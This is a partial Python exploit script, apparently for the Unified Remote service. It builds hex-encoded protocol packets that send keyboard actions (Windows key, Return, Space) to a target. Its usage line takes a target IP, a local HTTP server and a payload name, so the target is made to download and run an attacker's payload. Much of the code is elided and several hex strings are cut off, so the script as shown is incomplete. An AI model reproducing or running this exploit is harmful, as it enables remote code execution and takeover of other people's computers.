...
open = bytes.fromhex(
    "00000085000108416374696f6e00000550617373776f72640038653831333362332d61313862"
    ...
    "000356657273696f6e000000000a00"
).decode("utf-8")

open_fin = bytes.fromhex(
    "000000c8000108416374696f6e0001024361706162696c69746965730004416374696f6e7"
...
one = bytes.fromhex(
    "000000d2000108416374696f6e00070549440052656c6d746563682e4b6579626f61726400024"
    "c61796f75740006436f6e74726f6c73000200024f6e416374696f6e0002457874726173000656616c756"
    "5730002000556616c756500"
).decode("utf-8")

two = bytes.fromhex(
    "00000000054e616d6500746f67676c6500000854797065000800000008526571756573740007"
    "0252756e0002457874726173000656616c7565730002000556616c756500"
).decode("utf-8")

three = bytes.fromhex(
    "00000000054e616d6500746f67676c65000005536f7572636500616e64726f69642d643730"
    "386531346535323834636238310000"
).decode("utf-8")

win_key = bytes.fromhex(
    "000000d8000108416374696f6e00070549440052656c6d746563682e4b6579626f61726"
...
ret_key = bytes.fromhex(
    "000000dc000108416374696f6e00070549440052656c6d746563682e4b6579626f6172"
    ...
    "00616e64726f69642d643730386531346535323834636238310000"
).decode("utf-8")

space_key = bytes.fromhex(
    "000000da000108416374696f6e00070549440052656c6d746563682e4b6579626f6"
...
try:
    ...
    print(
        "Usage: python " + sys.argv[0] + " <target-ip> <local-http-ip> <payload-name>"
    )
